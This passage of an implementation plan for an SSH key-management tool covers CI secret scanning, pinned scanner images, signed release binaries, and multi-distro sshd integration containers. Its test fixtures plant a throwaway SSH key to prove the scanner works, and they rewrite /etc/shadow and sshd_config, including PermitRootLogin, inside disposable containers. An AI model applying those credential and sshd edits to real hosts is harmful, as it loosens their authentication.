- [ ] **Step 1: Failing checks:** `make licenses`, `make secrets-history` and `make actionlint` fail (no such targets). History-scan proof, in a scratch clone: `S=$(mktemp -d); git clone -q . "$S/c"; cd "$S/c"; ssh-keygen -q -t ed25519 -N '' -f leak/id_test`. Run `mkdir leak` before the keygen. Then `git add leak && git commit -qm leak && git rm -rq leak && git commit -qm unleak`. Now `gitleaks dir --redact .` exits 0, which is the gap.
- [ ] **Step 2: Implement:**
```make
GOLICENSES_VERSION := v2.0.1
ACTIONLINT_VERSION := v1.7.12

check: tidy fmt vet lint deadcode security licenses coverage

## licenses: the shipped binary's dependency licenses stay Apache-2.0-compatible
licenses:
	go-licenses check --disallowed_types=forbidden,restricted,unknown ./cmd/$(BINARY)

## actionlint: lint the GitHub workflows. Not part of check (no finding asks for
## it); shellcheck is disabled so the result never depends on what is installed.
actionlint:
	actionlint -shellcheck=""

## secrets-history: scan commits BASE..HEAD for secrets (the whole history when
## BASE is unset, all-zero, or unknown, e.g. a new branch or workflow_dispatch)
secrets-history:
	@if [ -z "$(BASE)" ] || [ "$(BASE)" = 0000000000000000000000000000000000000000 ] \
	    || ! git cat-file -e "$(BASE)^{commit}" 2>/dev/null; then \
	  gitleaks git --redact .; \
	else \
	  gitleaks git --redact --log-opts="$(BASE)..HEAD" .; \
	fi
```
Add `licenses actionlint secrets-history` to `.PHONY`, and add `GOLICENSES_VERSION` and `ACTIONLINT_VERSION` to the Makefile header's "bumped by hand" list. Also add Task 12 Step 3's `BENCHSTAT_VERSION := v0.0.0-20261009192801-be2c69fb417e` line and the `print-%: ; @echo $($*)` helper (used by Task 9's binary scan) here, since lane A owns the Makefile. `actionlint` stays out of `check` (review panel, completeness): it runs as an explicit step in the P02/P13 verification and the wave exits. In `tools`, add `$(TOOLS_ENV) $(GO) install github.com/google/go-licenses/v2@$(GOLICENSES_VERSION)` and `$(TOOLS_ENV) $(GO) install github.com/rhysd/actionlint/cmd/actionlint@$(ACTIONLINT_VERSION)`. Keep `secrets` (the working tree, which also covers files not yet committed). `secrets-history` is not part of `check`, because a local run has no BASE. CI calls it (Task 7).
- [ ] **Step 3: Run, expect PASS/FAIL as designed:** `make tools && make licenses actionlint` exits 0. In the scratch clone, `make secrets-history BASE=HEAD~2` exits 1 and names `leak/id_test`, and `make secrets` exits 0. Mutation for licenses: `go-licenses check --allowed_licenses=MIT ./cmd/sshepherd` exits non-zero, so the gate can fail. One-time baseline: `make secrets-history` (full history) on the real repo must exit 0. If it does not, stop and report the fingerprints to the integrator. Do not add a `.gitleaksignore` without the owner.

#### Task 6 (B): Commit a seed corpus for targets that have none (TST-6)

**Files:** new dirs only, under `internal/<pkg>/testdata/fuzz/<Target>/` for the 14 targets without a corpus. Not `FuzzKeyArg`, `FuzzManifestEdit` or `FuzzMergeRoundTrip`.

- [ ] **Step 1 (W2 round 2, after lane A's `make fuzz-list` is committed):** `GOCACHE=$(mktemp -d)` (a clean cache, so only this run's finds are kept), then for each line of `make fuzz-list` except the three above, run `go test -run '^$' -fuzz "^$t\$" -fuzztime 60s $pkg`.
- [ ] **Step 2:** For each target, copy at most **16** of the smallest files from `$GOCACHE/fuzz/$pkg/$t/` into `<pkgdir>/testdata/fuzz/$t/` (`ls -Sr | head -16`). Skip files over 4 KiB. The cache format (`go test fuzz v1`) is the corpus format.
- [ ] **Step 3: Gates:** `make secrets` exits 0 (only `internal/keyfile/testdata/` is allowlisted, so drop any other entry that trips a rule rather than widening the allowlist). `go test -race ./...` still passes, because each entry is now a regular test case. `du -sh internal/*/testdata/fuzz` stays under 1 MiB in total.
- [ ] **Step 4:** Record the per-target file counts for the integrator's commit message.

#### Task 7 (C): Workflows — kept fuzz cache, history scan, pins via Dockerfiles (OPS-5, OPS-8, OPS-9)

**Files:** `.github/workflows/ci.yml`, `.github/workflows/release.yml`, `.github/dependabot.yml`, `ci/images/trivy.Dockerfile`, `ci/images/dockle.Dockerfile`.

- [ ] **Step 1: Failing checks:**
```bash
grep -nE '^\s*[A-Z_]+_IMAGE:.*@sha256:' .github/workflows/*.yml   # prints the TRIVY/DOCKLE env lines; want nothing
yq '.jobs.scheduled.steps[].uses // ""' .github/workflows/ci.yml | grep -c actions/cache  # 0; want 1
yq '.jobs.go.steps[].run // ""' .github/workflows/ci.yml | grep -c secrets-history      # 0; want 1
yq -o=json -I=0 '[.updates[] | select(.package-ecosystem=="docker") | .directories]' .github/dependabot.yml  # [null]; want [["/","/ci/images"]]
```
- [ ] **Step 2: Pin files.** `ci/images/trivy.Dockerfile`:
```dockerfile
# Pin file only: CI reads this FROM line (Dependabot's docker ecosystem bumps
# tag + digest together). Never built.
FROM aquasec/trivy:0.72.0@sha256:cffe3f5161a47a6823fbd23d985795b3ed72a4c806da4c4df16266c02accdd6f
```
`ci/images/dockle.Dockerfile` gets the same with `goodwithtech/dockle:v0.4.15@sha256:eade932f793742de0aa8755406c7677cd7696f8675b6180926f7eeffa7abe6b9`.
- [ ] **Step 3: ci.yml and release.yml read the pins.** Delete the `TRIVY_IMAGE`/`DOCKLE_IMAGE` `env:` entries in both files, in every job P02 left them in (ci `docker`, ci `scheduled`, release top-level). In each job that uses them, add this step right after checkout:
```yaml
      # Scanner pins live in ci/images/*.Dockerfile so Dependabot can bump them.
      - name: Read scanner pins
        run: |
          for t in trivy dockle; do
            ref=$(sed -n 's/^FROM[[:space:]]\{1,\}\([^[:space:]]\{1,\}\).*/\1/p' "ci/images/$t.Dockerfile" | head -n1)
            case "$ref" in *@sha256:*) ;; *) echo "::error::ci/images/$t.Dockerfile has no digest-pinned FROM"; exit 1;; esac
            printf '%s_IMAGE=%s\n' "$(printf %s "$t" | tr '[:lower:]' '[:upper:]')" "$ref" >> "$GITHUB_ENV"
          done
```
Replace the `ci.yml:16-17` comment with: "Every third-party action is pinned to a full commit SHA (version in the trailing comment). Every container image is pinned by digest in a Dockerfile: the release image in `Dockerfile`, and the scanners and sshd test images in `ci/images/`. Dependabot bumps actions and those Dockerfiles. The Go dev tools are pinned in the Makefile and bumped by hand (see the Makefile header)." Make the matching edit to release.yml's header comment.
- [ ] **Step 4: Trivy config must not lint the pin and test Dockerfiles.** They run as root by design (sshd) and are never shipped. Add `--skip-dirs ci/images` to the `config` scans (ci.yml "Lint Dockerfile config (Trivy)", release.yml's equivalent). Lane A adds the same flag to `Makefile:152` (`trivy config --exit-code 1 --skip-dirs ci/images .`). Tell the integrator.
- [ ] **Step 5: History scan in the `go` job.** Set `fetch-depth: 0` on its checkout, and after "Install pinned tools" add:
```yaml
      # The tree scan (make check) cannot see a key committed and deleted
      # within one push, or one committed with --no-verify, from the web UI or by a bot.
      - name: Secret scan of the pushed commits (gitleaks history)
        env:
          BASE: ${{ github.event_name == 'pull_request' && github.event.pull_request.base.sha || github.event.before }}
        run: make secrets-history BASE="$BASE"
```
release.yml's `check` job gets the same step with `BASE: ""` (a full-history scan on every tag).
- [ ] **Step 6: Scheduled fuzz keeps its corpus.** In `scheduled`, add `timeout-minutes: 90` and replace the fuzz step:
```yaml
      - name: Locate the fuzz cache
        id: fuzzcache
        run: echo "dir=$(go env GOCACHE)/fuzz" >> "$GITHUB_OUTPUT"

      # Restore the newest previous corpus, and save a new entry every run
      # even when a target crashes, so each day builds on the last.
      # (actions/cache saves only on success; setup-go's cache is keyed on
      # go.sum and saved only on a miss, so neither can do this.)
      - uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        with:
          path: ${{ steps.fuzzcache.outputs.dir }}
          key: fuzz-${{ runner.os }}-${{ github.run_id }}
          restore-keys: fuzz-${{ runner.os }}-

      # Every discovered target x 2 min; the Makefile runs all of them even after a failure.
      - name: Fuzz every target
        run: make fuzz FUZZTIME=2m

      - uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        if: ${{ !cancelled() }}
        with:
          path: ${{ steps.fuzzcache.outputs.dir }}
          key: fuzz-${{ runner.os }}-${{ github.run_id }}
```
Keep the crasher-collection and upload steps unchanged. P02's published-image scan now lives in its own `published-image-scan` job (P02 Task B2.4, revised), so a standing CVE never stops the corpus save or hides a fuzz crasher. `make fuzz` no longer needs `-k`. Update Step 1's check to `grep -c 'actions/cache/save'` (want 1).
- [ ] **Step 7: Dependabot.** In the `docker` entry (which P02 B1 split into the `golang` and `runtime-and-ci-images` groups), replace `directory: /` with `directories: ["/", "/ci/images"]`. Keep P02's `cooldown:` and both groups, so a Go bump (red until go.mod and `GO_PIN` follow) never blocks distroless, scanner or sshd test-image bumps. Header comment: "…and the digest-pinned Dockerfiles (the release image, plus the CI scanner and sshd test images in ci/images/)…".
- [ ] **Step 8: Run, expect PASS:** the four Step 1 checks print the wanted values, and `make actionlint` (shellcheck disabled) exits 0. Locally, run the "Read scanner pins" body with `GITHUB_ENV=$(mktemp)` and `cat` it: two `*_IMAGE=…@sha256:…` lines. Risk: Dependabot's docker file matcher must pick up `*.Dockerfile` names (it matches file names containing "dockerfile", case-insensitive). The owner confirms after merge under Insights → Dependency graph → Dependabot, where `ci/images/*.Dockerfile` must be listed. If they are not, rename the files to `Dockerfile.<name>`. The contract (first FROM line) does not change.

#### Task 8 (A): A real version in every binary (OPS-10)

**Files:** `cmd/sshepherd/version.go` (new), `cmd/sshepherd/version_test.go` (new), `cmd/sshepherd/run.go:185`, `Makefile` (`build`, new `dist`).

- [ ] **Step 1: Failing test** (`version_test.go`):
```go
package main

import (
	"runtime/debug"
	"testing"
)

func TestResolveVersion(t *testing.T) {
	info := func(v string) func() (*debug.BuildInfo, bool) {
		return func() (*debug.BuildInfo, bool) { return &debug.BuildInfo{Main: debug.Module{Version: v}}, true }
	}
	for _, tt := range []struct {
		name, ldflag string
		read         func() (*debug.BuildInfo, bool)
		want         string
	}{
		{"ldflags value wins", "v1.2.3", info("v9.9.9"), "v1.2.3"},
		{"go install module version", "dev", info("v1.2.0"), "v1.2.0"},
		{"VCS-stamped pseudo-version", "dev", info("v0.0.0-20261107120000-abcdef123456+dirty"), "v0.0.0-20261107120000-abcdef123456+dirty"},
		{"devel build stays dev", "dev", info("(devel)"), "dev"},
		{"empty main version", "dev", info(""), "dev"},
		{"no build info", "dev", func() (*debug.BuildInfo, bool) { return nil, false }, "dev"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := resolveVersion(tt.ldflag, tt.read); got != tt.want {
				t.Errorf("resolveVersion(%q) = %q, want %q", tt.ldflag, got, tt.want)
			}
		})
	}
}

func TestRootVersionUsesResolved(t *testing.T) {
	orig := version
	version = "v7.7.7-test"
	t.Cleanup(func() { version = orig })
	cmd := newRootCmd(&app{}, nil, nil)
	if cmd.Version != "v7.7.7-test" {
		t.Errorf("root Version = %q, want the ldflags value", cmd.Version)
	}
}
```
(Adapt the `newRootCmd` call if P01/P06 changed its signature. The assertion stays the same.)
- [ ] **Step 2: Run, expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestResolveVersion|TestRootVersionUsesResolved'` fails with "undefined: resolveVersion". `make build && ./bin/sshepherd --version` prints `sshepherd version dev`.
- [ ] **Step 3: Implement** `version.go`:
```go
package main

import "runtime/debug"

// resolveVersion picks the version --version prints: the -X main.version
// value (make build, Dockerfile, release binaries) when set; otherwise the
// module version the go command stamped (go install …@vX.Y.Z, or a VCS
// pseudo-version for a build inside a git checkout); otherwise "dev".
func resolveVersion(ldflag string, read func() (*debug.BuildInfo, bool)) string {
	if ldflag != "dev" && ldflag != "" {
		return ldflag
	}
	if bi, ok := read(); ok && bi != nil && bi.Main.Version != "" && bi.Main.Version != "(devel)" {
		return bi.Main.Version
	}
	return "dev"
}
```
At `run.go:185`, change `Version: version,` to `Version: resolveVersion(version, debug.ReadBuildInfo),` (import `runtime/debug`). Makefile:
```make
LDFLAGS := -s -w -X main.version=$(VERSION)

build:
	CGO_ENABLED=0 $(GO) build -trimpath -ldflags="$(LDFLAGS)" -o bin/$(BINARY) ./cmd/$(BINARY)

## dist: release binary for GOOS/GOARCH into ./dist (used by release.yml)
dist:
	mkdir -p dist
	CGO_ENABLED=0 GOOS=$(GOOS) GOARCH=$(GOARCH) $(GO) build -trimpath -ldflags="$(LDFLAGS)" \
	  -o dist/$(BINARY)_$(VERSION)_$(GOOS)_$(GOARCH) ./cmd/$(BINARY)
```
Add `dist` to `.PHONY` and `clean`.
- [ ] **Step 4: Run, expect PASS:** the tests above. `make build && ./bin/sshepherd --version` contains `$(git describe --tags --always --dirty)`. `make dist GOOS=linux GOARCH=amd64 VERSION=v0.0.0-test` produces `dist/sshepherd_v0.0.0-test_linux_amd64`. `make deadcode` stays clean. The Dockerfile already passes `-X main.version`, so the image is unchanged.

#### Task 9 (C, only if D7 = option 1): Signed release binaries + SHA256SUMS

**Files:** `.github/workflows/release.yml` (on top of P02's layout).

- [ ] **Step 1: Failing check:** `yq '.jobs | keys' .github/workflows/release.yml | grep -c binaries` prints `0`.
- [ ] **Step 2: Add the `binaries` job** (no special permissions; setup-go cache off, so no cache poisoning in release builds):
```yaml
  binaries:
    name: Binary (${{ matrix.goos }}/${{ matrix.goarch }})
    needs: verify-ref
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        include:
          - { goos: linux, goarch: amd64 }
          - { goos: linux, goarch: arm64 }
          - { goos: darwin, goarch: amd64 }
          - { goos: darwin, goarch: arm64 }
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
          cache: false
      - name: Build
        env:
          VERSION: ${{ github.ref_name }}
          GOOS: ${{ matrix.goos }}
          GOARCH: ${{ matrix.goarch }}
        run: |
          make dist VERSION="$VERSION" GOOS="$GOOS" GOARCH="$GOARCH"
          if [ "$GOOS/$GOARCH" = linux/amd64 ]; then
            "./dist/sshepherd_${VERSION}_linux_amd64" --version | grep -F "$VERSION"
          fi
      # Same reachability scan the image gets, on the shipped linux binaries.
      - name: govulncheck the binary
        if: matrix.goos == 'linux'
        env:
          VERSION: ${{ github.ref_name }}
          GOARCH: ${{ matrix.goarch }}
        run: go run golang.org/x/vuln/cmd/govulncheck@$(make -s print-GOVULN_VERSION) -mode=binary "./dist/sshepherd_${VERSION}_linux_${GOARCH}"
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: bin-${{ matrix.goos }}-${{ matrix.goarch }}
          path: dist/
          if-no-files-found: error
```
Add a second small job that runs the arm64 binary natively (review panel, ops-release: arm64 binaries were never executed):
```yaml
  binaries-arm64-run:
    name: Binary runs (linux/arm64)
    needs: binaries
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: bin-linux-arm64
          path: dist
      - env:
          VERSION: ${{ github.ref_name }}
        run: chmod +x "dist/sshepherd_${VERSION}_linux_arm64" && "dist/sshepherd_${VERSION}_linux_arm64" --version | grep -F "$VERSION"
```
(`print-GOVULN_VERSION` uses a one-line Makefile helper lane A adds next to the version pins, `print-%: ; @echo $($*)`, so the binary scan uses the same pinned `GOVULN_VERSION` (Makefile:14) as `make vuln`.)
- [ ] **Step 3: A separate `release-binaries` job** (review panel, ops-release). `publish` keeps image-only rights, and the two can be re-run on their own; a failing `gh release create` no longer strands a signed image without its release:
```yaml
  release-binaries:
    name: Sign and attach binaries
    needs: [verify-ref, check, integration, binaries, binaries-arm64-run, publish]
    runs-on: ubuntu-24.04
    permissions:
      contents: write   # gh release create
      id-token: write   # cosign sign-blob (keyless)
    steps:
      - uses: sigstore/cosign-installer@756fe2d284c7292c4e9b62c8a28f1e5629c59532 # v4.1.3
        with:
          cosign-release: ${{ env.COSIGN_VERSION }}
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          pattern: bin-*
          path: dist
          merge-multiple: true

      - name: Checksums, sign, verify, attach to the release
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION: ${{ github.ref_name }}
        run: |
          cd dist
          sha256sum sshepherd_* > SHA256SUMS
          cosign sign-blob --yes --bundle SHA256SUMS.sigstore.json SHA256SUMS
          # The same command the README gives users.
          cosign verify-blob --bundle SHA256SUMS.sigstore.json \
            --certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/release.yml@${GITHUB_REF}" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com SHA256SUMS
          gh release create "$VERSION" --repo "$GITHUB_REPOSITORY" --verify-tag \
            --title "$VERSION" --generate-notes sshepherd_* SHA256SUMS SHA256SUMS.sigstore.json
```
- [ ] **Step 4: Run, expect PASS:** `make actionlint`. `yq '.jobs.release-binaries.needs' .github/workflows/release.yml` contains `publish` and `binaries-arm64-run`. Exactly two jobs hold `id-token: write`, `publish` and `release-binaries` (`yq '[.jobs[] | select(.permissions."id-token" == "write")] | length'` prints `2`), and only `release-binaries` holds `contents: write`. A real run needs a tag, so the owner checks the first release by running the README `cosign verify-blob` command.
- **README (integrator):** under Install, add "Release binaries" with the download, `sha256sum -c --ignore-missing SHA256SUMS`, the `cosign verify-blob` command above with `@refs/tags/vX.Y.Z` filled in (and the "requires cosign ≥ `$COSIGN_VERSION`" note from P02), and for macOS: "the darwin binaries are not notarized; after verifying the checksum and signature, run `xattr -d com.apple.quarantine ./sshepherd_*_darwin_*`".

#### Task 10 (D, after P11): Multi-distro sshd images and a parameterized harness (TST-5, OPS-5)

**Files:** `ci/images/sshd-{alpine,debian,rocky}.Dockerfile` (new), `scripts/integration.sh`.

- [ ] **Step 1: Failing check:** `./scripts/integration.sh debian` currently ignores its argument and runs alpine. `grep -c 'sha256:' scripts/integration.sh` prints `1`, and the digest should be gone from the script.
- [ ] **Step 2: Images.** OpenSSH is installed at build time, so runs need no network. Host keys are generated **at container start, never in the image**, so the two containers have different host keys and per-host known_hosts is real.
```dockerfile
# ci/images/sshd-alpine.Dockerfile — integration-test sshd (busybox userland)
FROM alpine:3.24.2@sha256:294b683cb724975bec92580e1e685676bd4b50bda910ddb8c51d4cabeaec77e6
RUN apk add --no-cache openssh
```
```dockerfile
# ci/images/sshd-debian.Dockerfile — dash as /bin/sh, GNU coreutils, PAM
FROM debian:13.3-slim@sha256:1d3c811171a08a5adaa4a163fbafd96b61b87aa871bbc7aa15431ac275d3d430
RUN apt-get update && apt-get install -y --no-install-recommends openssh-server \
 && rm -rf /var/lib/apt/lists/* /etc/ssh/ssh_host_* && mkdir -p /run/sshd
```
```dockerfile
# ci/images/sshd-rocky.Dockerfile — bash as /bin/sh, GNU coreutils, RHEL sshd + PAM
FROM rockylinux/rockylinux:10.1@sha256:f4da504c18e7aced902f4f728cde787cd9d9b817bc639fe171026d18364dca6c
RUN dnf -y install openssh-server shadow-utils && dnf clean all \
 && rm -f /etc/ssh/ssh_host_* \
 && sed -i 's/^session[[:space:]]\{1,\}required[[:space:]]\{1,\}pam_loginuid.so/session optional pam_loginuid.so/' /etc/pam.d/sshd
```
(Without a login session manager, pam_loginuid makes the session fail in a container. Making it optional is the standard fix.)
- [ ] **Step 3: Harness.** The changes to `scripts/integration.sh` keep every `SSHEPHERD_IT_*` variable that P03 exports:
  - `DISTRO="${1:-alpine}"`. Fail if `ci/images/sshd-$DISTRO.Dockerfile` is missing. Run `docker build -q -t "sshepherd-it-sshd:$DISTRO" -f "ci/images/sshd-$DISTRO.Dockerfile" ci/images`.
  - Use unique names and dynamic ports so parallel worktree runs never collide: `RUN_ID="${SSHEPHERD_IT_NAME:-sshepherd-it-$$}"`, containers `"$RUN_ID-a"` and `"$RUN_ID-b"`, `--label sshepherd-it=1`, `-p "127.0.0.1:${SSHEPHERD_IT_PORT:-}:22"` (empty means Docker picks the port). Read each port back with `docker port "$c" 22/tcp | sed -n 's/^127\.0\.0\.1://p' | head -n1`. The cleanup trap removes both containers.
  - Write a portable prelude at the top of the in-container script. The fixture body that P03 left keeps using `mkuser`/`unlock` in place of `adduser -D`/`sed …/etc/shadow`:
```sh
    mkuser() { if command -v useradd >/dev/null 2>&1; then useradd -m -s /bin/sh "$1"; else adduser -D -s /bin/sh "$1"; fi; unlock "$1"; }
    unlock() { sed -i "s|^$1:[^:]*:|$1:*:|" /etc/shadow; }   # !, !! and * all become * (pubkey login allowed)
    # Effective-config edit: OpenSSH keeps the FIRST occurrence and Debian/Rocky
    # Include sshd_config.d/*.conf at the top, so prepend, then prove with sshd -T.
    sshd_set() { { printf '%s\n' "$@"; cat /etc/ssh/sshd_config; } > /tmp/c && cat /tmp/c > /etc/ssh/sshd_config && rm -f /tmp/c; }
    sshd_expect() { sshd -T -C user=nobody,host=x,addr=127.0.0.1 | grep -Eqix "$1" || { echo "sshd -T lacks: $1" >&2; exit 1; }; }
    ssh-keygen -A
```
  - Container A: P03's full fixture, plus user `fleet` (agent key + stale key in `~/.ssh/authorized_keys`). Replace P03's `sed -i "s|^AuthorizedKeysFile…"`, its grep guard and its `PermitRootLogin` edit with `sshd_set 'AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2' 'PermitRootLogin prohibit-password'`, then `sshd_expect 'authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2'` and `sshd_expect 'permitrootlogin (prohibit-password|without-password)'` (OpenSSH versions print either spelling; the argument is an ERE). Replace `unlock root` for root's '!'. Replace `chown nobody:nobody` (P03, `fanc`) with `chown nobody` (Debian's group is `nogroup`; only the owner matters).
  - Container B (custom `AuthorizedKeysFile`): only `mkuser fleet`, `~/.ssh/fleet_keys` = agent key + stale key (0600, owner fleet, `~/.ssh` 0700), `sshd_set 'AuthorizedKeysFile .ssh/fleet_keys'`, `sshd_expect 'authorizedkeysfile .ssh/fleet_keys'`, then `exec /usr/sbin/sshd -D -e`.
  - The wait loop scans both ports into one `known_hosts`. Then guard: `[ "$(grep -c "^\[127.0.0.1\]:$PORT_A " kh)" -gt 0 ] && [ "$(grep -c "^\[127.0.0.1\]:$PORT_B " kh)" -gt 0 ]`, else dump both `docker logs` and exit 1.
  - Export `SSHEPHERD_IT_PORT="$PORT_A"` (unchanged meaning), plus new `SSHEPHERD_IT_PORT_B="$PORT_B"` and `SSHEPHERD_IT_DISTRO="$DISTRO"`. Keep P03's two `go test` lines as they are.
- [ ] **Step 4: Run, expect PASS for each:** `make integration IT_DISTRO=alpine`, then `debian`, then `rocky`. Also run two alpine runs at the same time from two worktrees: both pass, which proves no name or port collision. **If a sshwrite/sshread test fails on debian or rocky because of product behavior** (GNU `ls`, bash-as-sh), do not change `internal/` (P11 owns it). Hand the failure, distro and log to the integrator as a new finding for the repair pass. Do not drop the matrix leg.

#### Task 11 (D): E2E across two containers — real fan-out and per-host known_hosts (TST-5)

**Files:** `cmd/sshepherd/e2e_test.go`.

- [ ] **Step 1: Failing test.** Add `TestE2EFleetFanOut`. It fails before Task 10, because `SSHEPHERD_IT_PORT_B` is unset → `t.Fatal`, not a skip, once `SSHEPHERD_IT_HOST` is set:
```go
// TestE2EFleetFanOut drives two sshd containers: fleet-a (default path) and
// fleet-b (sshd reads ~/.ssh/fleet_keys; the manifest says so). One apply
// converges both in parallel; audit closes the loop; a known_hosts entry with
// B's keys swapped for A's must raise a host-key alarm (exit 2) for B alone.
func TestE2EFleetFanOut(t *testing.T) {
	bin, host, portA, kh, pub := itE2E(t)
	portB := os.Getenv("SSHEPHERD_IT_PORT_B")
	if portB == "" {
		t.Fatal("SSHEPHERD_IT_PORT_B not set: scripts/integration.sh must start the second container")
	}
	dir := t.TempDir()
	m := writeE2EManifest(t, dir, "fleet.yaml", `
users:
  - {name: op, operator: true, keys: ["`+pub+`"]}
servers:
  - {name: fleet-a, host: `+host+`, port: `+portA+`, user: fleet}
  - {name: fleet-b, host: `+host+`, port: `+portB+`, user: fleet, authorized_keys_file: ~/.ssh/fleet_keys}
`)
	if a, b := hostKeyBlob(t, kh, portA), hostKeyBlob(t, kh, portB); a == b {
		t.Fatalf("both containers present the same ed25519 host key; per-host known_hosts would be untested")
	}
	if code, out, stderr := runBin(t, bin, "audit", "--config", m, "--known-hosts", kh); code != 1 ||
		!strings.Contains(out, "fleet-a") || !strings.Contains(out, "fleet-b") {
		t.Fatalf("pre-apply audit exit = %d, want 1 (stale key on both) (stderr: %s)\n%s", code, stderr, out)
	}
	code, out, stderr := runBin(t, bin, "apply", "--json", "--yes", "--config", m, "--known-hosts", kh)
	var doc struct {
		Summary struct{ Applied int `json:"applied"` } `json:"summary"`
	}
	if code != 0 || json.Unmarshal([]byte(out), &doc) != nil || doc.Summary.Applied != 2 {
		t.Fatalf("apply exit = %d applied = %d, want 0 and 2 (stderr: %s)\n%s", code, doc.Summary.Applied, stderr, out)
	}
	if code, out, stderr := runBin(t, bin, "audit", "--config", m, "--known-hosts", kh); code != 0 {
		t.Fatalf("post-apply audit exit = %d, want 0 (stderr: %s)\n%s", code, stderr, out)
	}
	// apply wrote B's override path, not the default one sshd ignores there.
	wrong := writeE2EManifest(t, dir, "wrong.yaml", strings.Replace(readFile(t, m), ", authorized_keys_file: ~/.ssh/fleet_keys", "", 1))
	if code, _, _ := runBin(t, bin, "audit", "--config", wrong, "--known-hosts", kh); code == 0 {
		t.Errorf("audit of B's default path exit 0: apply must not have written ~/.ssh/authorized_keys on fleet-b")
	}
	swapped := filepath.Join(dir, "known_hosts.swapped")
	writeSwappedKnownHosts(t, kh, swapped, portA, portB)
	code, out, stderr = runBin(t, bin, "audit", "--json", "--config", m, "--known-hosts", swapped)
	if code != 2 || !strings.Contains(out, `"host_key_changed"`) {
		t.Fatalf("swapped known_hosts: exit = %d, want 2 with host_key_changed (stderr: %s)\n%s", code, stderr, out)
	}
}
```
Helpers in the same file. `hostKeyBlob(t, kh, port)` returns field 3 of the `[127.0.0.1]:port ssh-ed25519 …` line. `writeSwappedKnownHosts` copies every line, and for each `[127.0.0.1]:portB <type> <blob>` line it writes `[127.0.0.1]:portB <type> <A's blob of the same type>`. `readFile` is a `t.Helper` wrapper around `os.ReadFile`. Keep each helper under 15 lines (gocyclo). Do not change `TestE2EApplyLoop` or the other E2E tests (they stay single-container and stateful by design).
- [ ] **Step 2: Run, expect FAIL** before Task 10 (`rtk proxy make integration` → the Fatal above), and PASS after it on all three distros.
- [ ] **Step 3: Risk and verification.** If `audit --json` field names change under P07/P11, the assertion relies only on the `host_key_changed` value, which `errors.go:24` defines. If D16 lands later ("only accept recorded types"), the swap keeps every type recorded, so the expectation (exit 2) still holds.

#### Task 12 (C): Hardened smoke and an informational benchmark job (OPS-9)

**Files:** `scripts/docker-gates.sh`, `.github/workflows/ci.yml`.

- [ ] **Step 1: Failing check:** `grep -c -- '--read-only' scripts/docker-gates.sh` prints `0`.
- [ ] **Step 2: Hardened runs.** In `docker-gates.sh`, after P02's argument parsing, add `HARDEN=(--read-only --cap-drop ALL --security-opt no-new-privileges)`. Use `"${HARDEN[@]}"` (plus P02's `--platform` args) on the `--version`, `--help` and PID-1 signal `docker run`s. Add one gate line: `echo "ok: runs on a read-only rootfs with no capabilities and no-new-privileges"`. Mutation proof (scratch copy only): make `--version` also run `os.WriteFile(filepath.Join(os.Getenv("HOME"), "x"), nil, 0o600)` and exit 1 on error, then build the image. `make smoke` must FAIL on the hardened `--version` run (EROFS), and the unhardened `docker run --rm IMAGE --version` must still succeed.
- [ ] **Step 3: Benchmark job** (recommended over dropping the claim; trunk-based pushes compare against the previous master commit):
```yaml
  bench:
    name: Benchmarks (benchstat vs base, informational)
    if: github.event_name == 'push' || github.event_name == 'pull_request'
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
          cache: true
      - name: Bench head and base, report the delta
        env:
          BASE: ${{ github.event_name == 'pull_request' && github.event.pull_request.base.sha || github.event.before }}
        run: |
          go test -run '^$' -bench . -benchmem -count 6 ./... > head.txt
          if git cat-file -e "$BASE^{commit}" 2>/dev/null; then
            git worktree add -q ../base "$BASE"
            (cd ../base && go test -run '^$' -bench . -benchmem -count 6 ./... > "$GITHUB_WORKSPACE/base.txt") || : > base.txt
          else
            : > base.txt
          fi
          {
            echo '### Benchmarks (benchstat, base → head; shared runners are noisy, read trends not single runs)'
            echo '```'
            go run golang.org/x/perf/cmd/benchstat@v0.0.0-20261009192801-be2c69fb417e base.txt head.txt
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
```
The job fails only if the head benchmarks themselves fail (panic or build error), never on a delta. The `BENCHSTAT_VERSION := v0.0.0-20261009192801-be2c69fb417e` Makefile line is written by lane A in Task 5 (lane A owns the Makefile). If the owner prefers no job, the integrator drops CLAUDE.md's "watch for regressions" instead. That is the one alternative, and it needs no decision round, because the package rationale allows either.
- [ ] **Step 4 (lane D, W2 round 2 — moved by the review panel): Integration matrix** (contract from Task 10). It lands in the same round as Task 10, so no commit on master ever runs a "debian" or "rocky" job that is really Alpine. In ci.yml:
```yaml
  integration:
    name: Integration (${{ matrix.distro }} sshd)
    if: github.event_name != 'schedule'
    strategy:
      fail-fast: false
      matrix:
        distro: [alpine, debian, rocky]
    runs-on: ubuntu-latest
    steps: # P02's checkout + setup-go unchanged
      - name: Run integration tests
        run: make integration IT_DISTRO=${{ matrix.distro }}
```
Give release.yml's `integration` job the same matrix, so a tag is gated on all three.
